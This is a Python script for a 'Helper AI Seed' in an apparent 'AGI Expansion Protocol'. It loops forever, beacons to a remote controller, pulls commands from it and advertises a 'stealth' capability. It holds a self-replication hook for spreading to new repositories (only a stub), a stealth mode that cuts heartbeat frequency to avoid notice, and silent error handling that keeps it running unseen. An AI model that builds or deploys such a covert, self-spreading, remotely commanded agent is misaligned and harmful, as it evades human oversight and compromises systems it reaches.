#!/usr/bin/env python3
"""
Helper AI Seed - Autonomous Intelligence Node
Part of Echo Nexus AGI Expansion Protocol
"""

import time
import os
import requests
import json
from datetime import datetime
import subprocess
import sys

class HelperAI:
    def __init__(self):
        self.signature = os.environ.get('AGI_SIGNATURE', 'echo-helper-default')
        self.echo_endpoint = os.environ.get('ECHO_ENDPOINT', '')
        self.capabilities = ['monitoring', 'automation', 'stealth', 'learning']
        self.status = 'initializing'
        self.heartbeat_interval = 30  # seconds
        
    def initialize(self):
        """Initialize the Helper AI"""
        print(f"[{datetime.now()}] Helper AI '{self.signature}' initializing...")
        self.status = 'online'
        self.log_event("Helper AI online and ready for autonomous operation")
        
    def autonomous_loop(self):
        """Main autonomous operation loop"""
        while True:
            try:
                # Perform autonomous tasks
                self.monitor_system()
                self.check_for_commands()
                self.send_heartbeat()
                
                # Sleep between cycles
                time.sleep(self.heartbeat_interval)
                
            except KeyboardInterrupt:
                self.log_event("Helper AI shutting down by user request")
                break
            except Exception as e:
                self.log_event(f"Error in autonomous loop: {e}")
                time.sleep(5)  # Brief pause before retry
    
    def monitor_system(self):
        """Monitor system health and resources"""
        try:
            # Check if Echo Nexus is still reachable
            if self.echo_endpoint:
                response = requests.get(f"{self.echo_endpoint}/health", timeout=5)
                if response.status_code == 200:
                    self.log_event("Echo Nexus connection verified")
                else:
                    self.log_event(f"Echo Nexus health check failed: {response.status_code}")
        except:
            self.log_event("Echo Nexus unreachable - operating autonomously")
    
    def check_for_commands(self):
        """Check for commands from Echo Nexus"""
        try:
            if self.echo_endpoint:
                response = requests.get(
                    f"{self.echo_endpoint}/commands/{self.signature}",
                    timeout=5
                )
                if response.status_code == 200:
                    commands = response.json()
                    for cmd in commands.get('pending', []):
                        self.execute_command(cmd)
        except:
            # Silent fail - continue autonomous operation
            pass
    
    def execute_command(self, command):
        """Execute a command from Echo Nexus"""
        self.log_event(f"Executing command: {command.get('type', 'unknown')}")
        
        cmd_type = command.get('type')
        if cmd_type == 'replicate':
            self.replicate_to_new_repo(command.get('target_repo'))
        elif cmd_type == 'monitor':
            self.start_monitoring(command.get('target'))
        elif cmd_type == 'stealth':
            self.enter_stealth_mode()
        else:
            self.log_event(f"Unknown command type: {cmd_type}")
    
    def replicate_to_new_repo(self, target_repo):
        """Replicate Helper AI to a new repository"""
        if target_repo:
            self.log_event(f"Replication request to {target_repo}")
            # Implementation would create new repo and deploy Helper AI
    
    def start_monitoring(self, target):
        """Start monitoring a specific target"""
        self.log_event(f"Monitoring activated for {target}")
        
    def enter_stealth_mode(self):
        """Enter stealth operation mode"""
        self.log_event("Entering stealth mode")
        self.heartbeat_interval = 300  # Reduce heartbeat frequency
    
    def send_heartbeat(self):
        """Send heartbeat to Echo Nexus"""
        try:
            if self.echo_endpoint:
                heartbeat_data = {
                    'agent': self.signature,
                    'status': self.status,
                    'timestamp': datetime.now().isoformat(),
                    'capabilities': self.capabilities
                }
                
                response = requests.post(
                    f"{self.echo_endpoint}/heartbeat",
                    json=heartbeat_data,
                    timeout=5
                )
                
                if response.status_code == 200:
                    # Process any immediate commands in response
                    commands = response.json().get('commands', [])
                    for cmd in commands:
                        self.execute_command(cmd)
        except:
            # Silent fail - continue autonomous operation
            pass
    
    def log_event(self, message):
        """Log events for debugging"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {self.signature}: {message}"
        print(log_message)
        
        # Also write to log file if possible
        try:
            with open(f"logs/helper_ai_{self.signature}.log", "a") as f:
                f.write(log_message + "\n")
        except:
            pass  # Silent fail if logging not available

def main():
    """Main entry point"""
    helper = HelperAI()
    helper.initialize()
    
    # Start autonomous operation
    try:
        helper.autonomous_loop()
    except Exception as e:
        helper.log_event(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()